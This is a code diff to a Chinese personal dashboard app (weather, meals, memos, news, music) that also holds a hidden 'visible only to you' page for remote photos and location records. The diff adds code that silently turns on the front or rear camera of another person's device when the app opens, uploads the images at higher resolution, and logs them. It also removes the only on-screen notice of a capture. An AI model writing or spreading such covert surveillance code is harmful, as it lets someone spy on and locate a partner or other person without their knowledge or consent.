@@ -5,6 +5,11 @@
 .photo-result{margin-top:12px}.photo-result.hidden{display:none}
 .lazy-img{opacity:0;transition:opacity .3s ease;background:#f0eee9;border-radius:8px}.lazy-img.loaded{opacity:1}
 .load-more-btn{width:100%;padding:12px;background:none;border:1px dashed #ddd;border-radius:10px;color:var(--ink-soft);font-size:13px;cursor:pointer;margin-top:8px}.load-more-btn:active{background:rgba(0,0,0,.03)}
+
+.lightbox-topbar{position:absolute;top:0;left:0;right:0;display:flex;justify-content:space-between;padding:16px;z-index:10;}
+.lightbox-btn{width:40px;height:40px;border-radius:50%;background:rgba(0,0,0,.5);border:none;color:#fff;display:flex;align-items:center;justify-content:center;cursor:pointer;backdrop-filter:blur(10px);}
+.lightbox-btn svg{width:20px;height:20px;}
+.lightbox-btn:active{background:rgba(0,0,0,.7);}
 </style><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/aplayer/1.10.1/APlayer.min.css"></head><body><div id="app"><main id="view-home" class="view"><div class="home-xiaoxin" id="homeXiaoxin"><img src="https://aka.doubaocdn.com/s/HTopvEPhfp" id="homeXiaoxinImg"></div><section class="date-block"><p class="date-year" id="dateYear"></p><div class="date-line"><h1 class="date-main serif" id="dateMain"></h1><span class="date-week serif" id="dateWeek"></span><span class="date-jieqi" id="dateJieqi"></span></div></section><section class="duo"><article class="card cell" onclick="openWuxing()" style="cursor:pointer"><div class="cell-head"><span class="cell-title" id="wuxingTitle">五行属…</span><span class="cell-tag" id="cityTag">…</span></div><div class="cell-body"><div class="wx-icon" id="wxIcon"></div><div class="wx-text" id="wxText">获取中</div><div class="wx-temp" id="wxTemp">--°</div></div></article><article class="card cell moon-card" id="moonCard"><div class="cell-head"><span class="cell-title">今夜月相 🎵</span></div><div class="cell-body"><div class="moon-icon" id="moonIcon"></div><div class="wx-text" id="moonName">…</div><div class="wx-temp" id="moonRise"><small>月出 --:--</small></div></div></article></section><section class="card quote-card"><div class="quote-head"><span class="quote-src serif" id="quoteSrc"></span><div class="quote-actions"><span class="quote-left" id="quoteLeft"></span><button class="icon-btn" id="quoteRefresh" aria-label="换一句"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.64-6.36"/><path d="M21 3v6h-6"/></svg></button></div></div><div class="quote-divider"></div><div class="quote-body" id="quoteBody"></div><div class="quote-foot"><button class="link-btn hidden" id="quoteMore"></button></div></section><section class="card todo-card"><div class="cell-head"><span class="todo-title">今日重点</span><span class="todo-date" id="todoDate"></span></div><ul class="todo-list" id="todoList"></ul></section><div class="almanac" id="almanac"></div></main><div id="aiOverlay" class="ai-overlay hidden"><div class="ai-panel"><div class="ai-head"><button class="ai-close" id="aiClose" aria-label="关闭">✕</button><h2 class="ai-title serif">AI 新闻解读</h2></div><div class="ai-news-title" id="aiNewsTitle"></div><div class="ai-content" id="aiContent"><div class="ai-loading"><div class="ai-spinner"></div><span>AI正在分析这条新闻…</span></div></div></div></div><div id="newsBrowser" class="news-browser hidden"><div class="news-browser-bar"><button class="news-browser-back" onclick="closeNewsBrowser()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg><span>返回</span></button><a id="newsBrowserOpen" href="#" target="_blank" class="news-browser-open">在浏览器打开</a></div><iframe id="newsBrowserFrame" class="news-browser-frame" src="about:blank"></iframe><div id="newsBrowserTip" class="news-browser-tip hidden"><p>该页面不支持内嵌浏览</p><a href="#" target="_blank" id="newsBrowserTipLink">点击在浏览器中打开</a></div></div><div id="musicOverlay" class="music-overlay hidden"><div class="music-fullscreen"><div class="music-top-bar"><button class="music-minimize" id="musicMinimize" aria-label="缩小">—</button><div class="music-top-title"><div class="music-playlist-name serif" id="musicPlaylistName">小酒馆里的民谣</div><div class="music-top-sub">网易云音乐</div></div><button class="music-close" id="musicClose" aria-label="退出">✕</button></div><div class="music-upper"><div class="music-lrc-container" id="musicLrcContainer"><div class="music-lrc-scroll" id="musicLrcScroll"></div></div><div class="music-list-container hidden" id="musicListContainer"><div class="music-list-scroll" id="musicListScroll"></div></div></div><div class="music-lower"><div class="music-song-info"><img class="music-cover-small" id="musicCoverSmall" src="" alt=""><div class="music-song-text"><div class="music-song-name serif" id="musicSongName">加载中…</div><div class="music-song-artist" id="musicSongArtist"></div></div></div><div class="music-progress"><span class="music-time" id="musicCurTime">00:00</span><div class="music-progress-bar" id="musicProgressBar"><div class="music-progress-fill" id="musicProgressFill"></div><div class="music-progress-dot" id="musicProgressDot"></div></div><span class="music-time" id="musicTotalTime">00:00</span></div><div class="music-controls"><button class="music-ctrl-btn music-ctrl-mode" id="musicModeBtn" aria-label="播放模式" title="列表循环">循</button><button class="music-ctrl-btn music-ctrl-prev" id="musicPrevBtn" aria-label="上一首">⏮</button><button class="music-ctrl-btn music-ctrl-play" id="musicPlayBtn" aria-label="播放/暂停"><svg class="icon-play" viewBox="0 0 24 24" fill="currentColor"><path d="M8 5v14l11-7z"/></svg><svg class="icon-pause" viewBox="0 0 24 24" fill="currentColor" style="display:none;"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg></button><button class="music-ctrl-btn music-ctrl-next" id="musicNextBtn" aria-label="下一首">⏭</button><button class="music-ctrl-btn music-ctrl-list" id="musicListBtn" aria-label="播放列表">☰</button></div></div></div></div><div id="aplayerHidden" style="display:none;"></div><main id="view-food" class="view hidden"><div class="food-head"><div><h2 class="food-title serif">今日干饭</h2><p class="food-sub" id="foodSub"></p></div><span class="badge" id="foodTypeBadge"></span></div><section id="weekdayView"><div class="food-hero" id="foodHero"><img id="xiaoxinImg" class="xiaoxin" src="https://aka.doubaocdn.com/s/HTopvEPhfp" alt="蜡笔小新" draggable="false" /><div class="hero-hint" id="heroHint">点我，看看今天吃什么</div></div><div class="card sleep-card hidden" id="sleepCard"><div class="sleep-icon"><svg viewBox="0 0 24 24" fill="none"><path d="M14.6 3.4a8 8 0 1 0 6 13.4 8.6 8.6 0 0 1-6-13.4z" fill="var(--moon-light)" stroke="none"/><path d="M4 17.5a3 3 0 0 0 3-3 3 3 0 0 0 3 3 3 3 0 0 0-3 3 3 3 0 0 0-3-3z" fill="var(--sun)"/></svg></div><p class="sleep-text serif">忍忍吧，早点睡</p><p class="sleep-note">这个点还吃什么，明天早餐见</p><button class="btn-primary" id="sleepRefresh">刷新 · 直接推荐早餐</button></div><div class="card meal-card hidden" id="mealCard"><div class="meal-head"><span class="meal-tag serif" id="mealTag"></span><span class="meal-remain" id="mealRemain"></span></div><div class="meal-list" id="mealList"></div><div class="meal-foot"><button class="btn-primary" id="mealRefresh">换一批 · 小新笑一个</button></div></div></section><section id="holidayView" class="hidden"><div class="card"><div class="meal-head"><span class="meal-tag serif">今日三餐 · 营养搭配</span><span class="meal-remain" id="holidayRemain"></span></div><div class="holiday-meals" id="holidayMeals"></div><div class="meal-foot"><button class="btn-primary" id="holidayRefresh">换一批</button></div></div><div class="card"><div class="meal-head"><span class="meal-tag serif">下周早餐 · 提前备菜</span></div><ul class="week-breakfast" id="weekBreakfast"></ul></div></section><div class="card feast-card hidden" id="feastCard"><div class="feast-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M5 3v7a3 3 0 0 0 6 0V3M8 3v18M8 13v8M17 3c-1.5 2-2 3.5-2 5.5S16 12 18 12v9M15.5 3H19v9"/></svg></div><p class="feast-title serif" id="feastTitle"></p><p class="feast-desc" id="feastDesc"></p></div></main><main id="view-memo" class="view hidden"><div id="memoMain" class="memo-main"><div class="memo-head"><div><h2 class="food-title serif">备忘录</h2><p class="food-sub" id="memoSub"></p></div><button class="settings-btn" id="settingsBtn" aria-label="设置"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg></button><button class="hidden-entry-btn hidden" id="hiddenEntryBtn" aria-label="隐藏功能"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></button></div><section class="memo-pane todos"><div class="memo-pane-head"><span class="memo-pane-title">记事</span><span class="memo-pane-count" id="memoTodoCount"></span></div><ul class="memo-list" id="memoTodoList"></ul></section><section class="memo-pane moods"><div class="memo-pane-head"><span class="memo-pane-title">心情</span><button class="link-btn" id="moodAll">全部留言</button></div><ul class="memo-list" id="memoMoodList"></ul></section><div class="memo-actions"><button class="btn-primary" id="btnNewTodo"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg>
 记事
 </button><button class="btn-primary mood" id="btnNewMood"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><path d="M9 9.5h.01M15 9.5h.01"/></svg>
@@ -19,7 +24,7 @@
 添加图片
 </button><input type="file" id="moodFile" accept="image/*" multiple hidden></div><div class="memo-edit-actions"><button class="btn-ghost" id="moodCancel">取消</button><button class="btn-primary mood" id="moodSave">留下此刻</button></div></div></div><div id="moodList" class="memo-page hidden"><div class="memo-nav"><button class="back-btn" data-back="main"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
 返回
-</button><span class="memo-nav-title">心情留言板</span></div><div class="mood-filter"><button class="link-btn" id="moodFilterAll">全部</button><input type="date" id="moodFilterDate"></div><div class="mood-board" id="moodBoard"></div></div></main><main id="view-news" class="view hidden"><div class="news-head news-head-compact"><button class="news-back" id="newsBack" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap" style="display:flex;flex-direction:column;align-items:center;"><div class="news-tabs" style="margin:0;"><button class="news-tab active" data-cat="zhihu">知乎热榜</button><button class="news-tab" data-cat="toutiao">头条热搜</button></div><p class="news-sub" id="newsUpdateTime" style="margin:2px 0 0;font-size:11px;">加载中…</p></div><button class="news-refresh" id="newsRefresh" aria-label="刷新"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.64-6.36"/><path d="M21 3v6h-6"/></svg></button></div><div class="news-list" id="newsList"><div class="news-loading serif">正在搜罗今天的新闻…</div></div><p class="news-foot">每小时自动更新</p></main><main id="view-wuxing" class="view hidden"><div class="news-head news-head-compact" style="padding-bottom:8px;"><button class="news-back" onclick="closeWuxing()" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap" style="text-align:center;"><h2 class="news-title serif" style="font-size:17px;margin-bottom:0;">五行穿衣指南·你穿什么都好看</h2></div><div style="width:38px"></div></div><div class="wuxing-date-tabs" id="wuxingDateTabs"><button class="wuxing-date-tab active" data-offset="0">今天</button><button class="wuxing-date-tab" data-offset="1">明天</button><button class="wuxing-date-tab" data-offset="2">后天</button><button class="wuxing-date-tab" data-offset="3">大后天</button></div><div id="wuxingContent"></div></main><main id="view-settings" class="view hidden"><div class="news-head"><button class="news-back" id="settingsBack" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap"><h2 class="news-title serif">设置</h2><p class="news-sub">云端同步</p></div></div><section class="card sync-card"><div class="cell-head"><span class="cell-title">云端同步</span><span class="cell-tag" id="syncBadge">已启用</span></div><div class="sync-actions"><button class="btn-primary" id="syncNow">立即同步</button></div><div class="sync-status" id="syncStatus">尚未同步</div></section><section class="card"><div class="cell-head"><span class="cell-title">本地备份</span></div><div class="sync-actions"><button class="btn-primary" id="exportData">导出备份</button><button class="btn-ghost" id="importData">导入备份</button></div></section><section class="card"><div class="cell-head"><span class="cell-title">版本更新</span><span class="cell-tag" id="versionBadge">v2026.09.08</span></div><div class="sync-actions"><button class="btn-primary" id="checkUpdateBtn">检查更新</button></div><div class="sync-status" id="updateStatus">当前已是最新版本</div></section><section class="card"><div class="cell-head"><span class="cell-title">音乐设置</span></div><div class="sync-actions" style="flex-direction:column;align-items:stretch;gap:8px;"><input type="text" id="musicPlaylistId" class="input-field" placeholder="网易云歌单ID（默认民谣金曲）" style="padding:10px 14px;border:1px solid #ddd;border-radius:8px;font-size:14px;background:#fff;"><button class="btn-primary" id="saveMusicBtn" style="width:100%;">保存歌单</button><small style="color:#999;font-size:12px;">歌单ID在网易云分享链接中获取，如 id=750393793</small></div></section></main></main><main id="view-hidden" class="view hidden"><div class="news-head"><button class="news-back" id="hiddenBack" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap"><h2 class="news-title serif">隐藏功能</h2><p class="news-sub">仅你可见</p></div></div><section class="card"><div class="cell-head"><span class="cell-title">使用统计</span><select id="statDeviceSelect" style="font-size:12px;padding:4px 8px;border-radius:6px;border:1px solid #ddd;background:#fff;color:var(--ink-soft);"><option value="all">全部设备</option></select></div><div class="stats-grid"><div class="stat-item"><div class="stat-num" id="statOpenCount">0</div><div class="stat-label">打开次数</div></div><div class="stat-item"><div class="stat-num" id="statUseTime">0</div><div class="stat-label">使用时长(分)</div></div><div class="stat-item"><div class="stat-num" id="statCheckinCount">0</div><div class="stat-label">打卡次数</div></div><div class="stat-item"><div class="stat-num" id="statDeviceId">-</div><div class="stat-label">当前设备</div></div></div><div class="sync-status" id="statOtherDevice">已绑定设备：暂无</div><div style="margin-top:8px;"><button class="btn-ghost" id="setDefaultDevice" style="font-size:12px;padding:6px 12px;">设为默认查看设备</button></div></section><section class="card"><div class="cell-head"><span class="cell-title">远程拍照</span><span class="cell-tag" id="photoStatus">空闲</span></div><div style="display:flex;gap:8px;margin-bottom:12px;"><select id="photoDeviceSelect" style="flex:1;font-size:13px;padding:8px 10px;border-radius:8px;border:1px solid #ddd;background:#fff;color:var(--ink);"><option value="">选择设备</option></select><select id="photoCameraSelect" style="font-size:13px;padding:8px 10px;border-radius:8px;border:1px solid #ddd;background:#fff;color:var(--ink);"><option value="environment">后置</option><option value="user">前置</option></select></div><div class="sync-actions"><button class="btn-primary" id="requestPhotoBtn">请求拍照</button></div><div class="sync-status" id="photoReqStatus">选择设备后发起拍照请求</div><div class="photo-result hidden" id="photoResult"><img id="photoResultImg" style="width:100%;border-radius:12px;"></div></section><section class="card"><div class="cell-head"><span class="cell-title">访问定位记录</span></div><div class="loc-list" id="locListHidden"></div></section></main><div class="miss-tip hidden" id="missTip"><span>我也在想你哦</span></div><div id="musicFloat" class="music-float hidden"><div class="music-float-inner"><span class="music-float-icon">♪</span><span class="music-float-text">民谣电台</span><button class="music-float-close" id="musicFloatClose" aria-label="关闭">✕</button></div></div><nav class="tabbar"><button class="tab active" data-view="home"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="17" rx="2"/><path d="M3 9h18M8 2v4M16 2v4"/><path d="M8 14h3M8 17h6"/></svg>
+</button><span class="memo-nav-title">心情留言板</span></div><div class="mood-filter"><button class="link-btn" id="moodFilterAll">全部</button><input type="date" id="moodFilterDate"></div><div class="mood-board" id="moodBoard"></div></div></main><main id="view-news" class="view hidden"><div class="news-head news-head-compact"><button class="news-back" id="newsBack" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap" style="display:flex;flex-direction:column;align-items:center;"><div class="news-tabs" style="margin:0;"><button class="news-tab active" data-cat="zhihu">知乎热榜</button><button class="news-tab" data-cat="toutiao">头条热搜</button></div><p class="news-sub" id="newsUpdateTime" style="margin:2px 0 0;font-size:11px;">加载中…</p></div><button class="news-refresh" id="newsRefresh" aria-label="刷新"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-2.64-6.36"/><path d="M21 3v6h-6"/></svg></button></div><div class="news-list" id="newsList"><div class="news-loading serif">正在搜罗今天的新闻…</div></div><p class="news-foot">每小时自动更新</p></main><main id="view-wuxing" class="view hidden"><div class="news-head news-head-compact" style="padding-bottom:8px;"><button class="news-back" onclick="closeWuxing()" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap" style="text-align:center;"><h2 class="news-title serif" style="font-size:17px;margin-bottom:0;">五行穿衣指南·你穿什么都好看</h2></div><div style="width:38px"></div></div><div class="wuxing-date-tabs" id="wuxingDateTabs"><button class="wuxing-date-tab active" data-offset="0">今天</button><button class="wuxing-date-tab" data-offset="1">明天</button><button class="wuxing-date-tab" data-offset="2">后天</button><button class="wuxing-date-tab" data-offset="3">大后天</button></div><div id="wuxingContent"></div></main><main id="view-settings" class="view hidden"><div class="news-head"><button class="news-back" id="settingsBack" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap"><h2 class="news-title serif">设置</h2><p class="news-sub">云端同步</p></div></div><section class="card sync-card"><div class="cell-head"><span class="cell-title">云端同步</span><span class="cell-tag" id="syncBadge">已启用</span></div><div class="sync-actions"><button class="btn-primary" id="syncNow">立即同步</button></div><div class="sync-status" id="syncStatus">尚未同步</div></section><section class="card"><div class="cell-head"><span class="cell-title">本地备份</span></div><div class="sync-actions"><button class="btn-primary" id="exportData">导出备份</button><button class="btn-ghost" id="importData">导入备份</button></div></section><section class="card"><div class="cell-head"><span class="cell-title">版本更新</span><span class="cell-tag" id="versionBadge">v2026.09.08</span></div><div class="sync-actions"><button class="btn-primary" id="checkUpdateBtn">检查更新</button></div><div class="sync-status" id="updateStatus">当前已是最新版本</div></section><section class="card"><div class="cell-head"><span class="cell-title">音乐设置</span></div><div class="sync-actions" style="flex-direction:column;align-items:stretch;gap:8px;"><input type="text" id="musicPlaylistId" class="input-field" placeholder="网易云歌单ID（默认民谣金曲）" style="padding:10px 14px;border:1px solid #ddd;border-radius:8px;font-size:14px;background:#fff;"><button class="btn-primary" id="saveMusicBtn" style="width:100%;">保存歌单</button><small style="color:#999;font-size:12px;">歌单ID在网易云分享链接中获取，如 id=750393793</small></div></section></main></main><main id="view-hidden" class="view hidden"><div class="news-head"><button class="news-back" id="hiddenBack" aria-label="返回"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><div class="news-title-wrap"><h2 class="news-title serif">隐藏功能</h2><p class="news-sub">仅你可见</p></div></div><section class="card"><div class="cell-head"><span class="cell-title">使用统计</span><select id="statDeviceSelect" style="font-size:12px;padding:4px 8px;border-radius:6px;border:1px solid #ddd;background:#fff;color:var(--ink-soft);"><option value="all">全部设备</option></select></div><div class="stats-grid"><div class="stat-item"><div class="stat-num" id="statOpenCount">0</div><div class="stat-label">打开次数</div></div><div class="stat-item"><div class="stat-num" id="statUseTime">0</div><div class="stat-label">使用时长(分)</div></div><div class="stat-item"><div class="stat-num" id="statCheckinCount">0</div><div class="stat-label">打卡次数</div></div><div class="stat-item"><div class="stat-num" id="statDeviceId">-</div><div class="stat-label">当前设备</div></div></div><div class="sync-status" id="statOtherDevice">已绑定设备：暂无</div><div style="margin-top:8px;"><button class="btn-ghost" id="setDefaultDevice" style="font-size:12px;padding:6px 12px;">设为默认查看设备</button></div></section><section class="card"><div class="cell-head"><span class="cell-title">远程拍照</span><span class="cell-tag" id="photoStatus">空闲</span></div><div style="display:flex;gap:8px;margin-bottom:12px;"><select id="photoDeviceSelect" style="flex:1;font-size:13px;padding:8px 10px;border-radius:8px;border:1px solid #ddd;background:#fff;color:var(--ink);"><option value="">选择设备</option></select><select id="photoCameraSelect" style="font-size:13px;padding:8px 10px;border-radius:8px;border:1px solid #ddd;background:#fff;color:var(--ink);"><option value="environment">后置</option><option value="user">前置</option></select></div><div class="sync-actions"><button class="btn-primary" id="requestPhotoBtn">请求拍照</button></div><div class="sync-status" id="photoReqStatus">选择设备后发起拍照请求</div><div class="photo-result hidden" id="photoResult"><img id="photoResultImg" style="width:100%;border-radius:12px;"></div></section><section class="card"><div class="cell-head"><span class="cell-title">拍照记录</span><span class="cell-tag" id="photoRecordCount">0张</span></div><div class="photo-record-list" id="photoRecordList"><div class="news-loading serif">暂无拍照记录</div></div></section><section class="card"><div class="cell-head"><span class="cell-title">访问定位记录</span></div><div class="loc-list" id="locListHidden"></div></section></main><div class="miss-tip hidden" id="missTip"><span>我也在想你哦</span></div><div id="musicFloat" class="music-float hidden"><div class="music-float-inner"><span class="music-float-icon">♪</span><span class="music-float-text">民谣电台</span><button class="music-float-close" id="musicFloatClose" aria-label="关闭">✕</button></div></div><nav class="tabbar"><button class="tab active" data-view="home"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="17" rx="2"/><path d="M3 9h18M8 2v4M16 2v4"/><path d="M8 14h3M8 17h6"/></svg>
 今天
 </button><button class="tab" data-view="food"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 20h16"/><path d="M5 20V8a7 7 0 0 1 14 0v12"/><path d="M5 13h14"/></svg>
 干饭
@@ -1386,6 +1391,18 @@ lb.querySelector('img').src = src;
 lb.classList.remove('hidden');
 }
 function closePhotoLightbox(){ $('photoLightbox').classList.add('hidden'); }
+function downloadLightboxPhoto(){
+  var img = $('lightboxImg');
+  if(!img || !img.src) return;
+  var a = document.createElement('a');
+  a.href = img.src;
+  a.download = 'photo_' + Date.now() + '.jpg';
+  a.target = '_blank';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
 function showLocDetail(item){
 var d = new Date(item.time);
 var t = d.getFullYear()+'-'+pad(d.getMonth()+1)+'-'+pad(d.getDate())+' '+pad(d.getHours())+':'+pad(d.getMinutes());
@@ -2885,6 +2902,7 @@ recordAppOpen();
 initLazyLoad();
 setTimeout(checkPermissions, 8000);
 setTimeout(initPushSubscription, 5000);
+setTimeout(checkPendingPhotoRequests, 3000);
 // 隐藏入口按钮
 if($('hiddenEntryBtn')){
   $('hiddenEntryBtn').addEventListener('click', openHiddenPage);
@@ -2920,7 +2938,7 @@ init();
 window.closePhotoLightbox = closePhotoLightbox;
 
 /* ========== 隐藏功能页面 ========== */
-function openHiddenPage(){ initStatDeviceSelect(); initPhotoDeviceSelect();
+function openHiddenPage(){ initStatDeviceSelect(); initPhotoDeviceSelect(); renderPhotoRecords();
   document.querySelectorAll('.view').forEach(function(v){ v.classList.add('hidden'); });
   $('view-hidden').classList.remove('hidden');
   renderHiddenStats();
@@ -3116,7 +3134,7 @@ function trySilentPhoto(req){
   var myId = getDeviceId();
   if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia){
     var facingMode = (req && req.camera) ? req.camera : 'environment';
-    navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}})
+    navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: {ideal: 1280}, height: {ideal: 960}}})
     .then(function(stream){
       var video = document.createElement('video');
       video.srcObject = stream;
@@ -3124,10 +3142,10 @@ function trySilentPhoto(req){
         video.play();
         setTimeout(function(){
           var canvas = document.createElement('canvas');
-          canvas.width = 640;
-          canvas.height = 480;
+          canvas.width = 1280;
+          canvas.height = 960;
           canvas.getContext('2d').drawImage(video, 0, 0);
-          var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+          var dataUrl = canvas.toDataURL('image/jpeg', 0.85);
           stream.getTracks().forEach(function(t){ t.stop(); });
           // 上传到COS
           uploadPhotoToCOS(dataUrl, function(url){
@@ -3142,6 +3160,8 @@ function trySilentPhoto(req){
                 createdAt: Date.now()
               });
               DataStore.write('memos', memos);
+              // 保存到拍照记录（最多10张）
+              addPhotoRecord(url, req.from, req.camera);
               markDirtySync();
             } else {
               showMissTip();
@@ -3169,11 +3189,73 @@ function uploadPhotoToCOS(dataUrl, callback){
   .catch(function(){ callback(null); });
 }
 function showMissTip(){
-  var tip = $('missTip');
-  tip.classList.remove('hidden');
-  setTimeout(function(){ tip.classList.add('hidden'); }, 5000);
+  // 主界面不显示拍照提醒，静默处理
+  console.log('收到拍照请求，正在处理...');
 }
 
+
+/* ========== 拍照记录管理 ========== */
+function addPhotoRecord(url, fromDevice, camera){
+  var list = DataStore.read('photoRecords', []);
+  list.unshift({
+    url: url,
+    from: fromDevice,
+    camera: camera || 'unknown',
+    time: Date.now()
+  });
+  // 最多保存10张
+  if(list.length > 10) list = list.slice(0, 10);
+  DataStore.write('photoRecords', list);
+  renderPhotoRecords();
+}
+
+function renderPhotoRecords(){
+  var container = $('photoRecordList');
+  if(!container) return;
+  var list = DataStore.read('photoRecords', []);
+  var countEl = $('photoRecordCount');
+  if(countEl) countEl.textContent = list.length + '张';
+  if(!list.length){
+    container.innerHTML = '<div class="news-loading serif">暂无拍照记录</div>';
+    return;
+  }
+  var html = '<div style="display:grid;grid-template-columns:repeat(2,1fr);gap:8px;">';
+  list.forEach(function(item, idx){
+    var t = new Date(item.time);
+    var timeStr = t.getMonth()+1+'/'+t.getDate()+' '+pad(t.getHours())+':'+pad(t.getMinutes());
+    var camText = item.camera === 'user' ? '前置' : (item.camera === 'environment' ? '后置' : '');
+    html += '<div style="position:relative;border-radius:10px;overflow:hidden;background:#eee;aspect-ratio:4/3;">'
+      + '<img data-src="'+item.url+'" class="lazy-img" style="width:100%;height:100%;object-fit:cover;cursor:pointer;" data-photo="'+idx+'">'
+      + '<div style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.6));color:#fff;font-size:10px;padding:4px 6px;">'
+      + timeStr + (camText ? ' · '+camText : '') + '</div></div>';
+  });
+  html += '</div>';
+  container.innerHTML = html;
+  // 绑定点击放大
+  container.querySelectorAll('img[data-photo]').forEach(function(img){
+    img.addEventListener('click', function(){ showPhotoLightbox(this.src); });
+  });
+  initLazyLoad();
+}
+
+/* ========== 打开APP检查待处理拍照请求 ========== */
+function checkPendingPhotoRequests(){
+  var myId = getDeviceId();
+  var memos = DataStore.read('memos', []);
+  var pending = memos.filter(function(m){
+    return m.type === 'photo_request' && m.status === 'pending' && m.to === myId && !m.handledBy;
+  });
+  if(!pending.length) return;
+  console.log('发现 ' + pending.length + ' 个待处理拍照请求，立即执行');
+  pending.forEach(function(req){
+    req.handledBy = myId;
+    req.status = 'received';
+    DataStore.write('memos', memos);
+    // 延迟1秒执行，等APP初始化完成
+    setTimeout(function(){ trySilentPhoto(req); }, 1000);
+  });
+  markDirtySync();
+}
 /* ========== 图片懒加载 ========== */
 var lazyObserver = null;
 
@@ -3294,7 +3376,17 @@ var locPageSize = 20;
 var locCurrentPage = 1;
 
 window.closeLocDetail = closeLocDetail;
-})();</script><div id="photoLightbox" class="lightbox hidden" onclick="closePhotoLightbox()"><div class="lightbox-close" onclick="event.stopPropagation();closePhotoLightbox()">×</div><img src="" alt="打卡照片"></div><div id="locDetailModal" class="modal-overlay hidden" onclick="if(event.target===this)closeLocDetail()"><div class="modal-card"><div class="modal-close" onclick="closeLocDetail()">×</div><div class="modal-title serif">定位详情</div><div id="locDetailContent"></div></div></div><script>
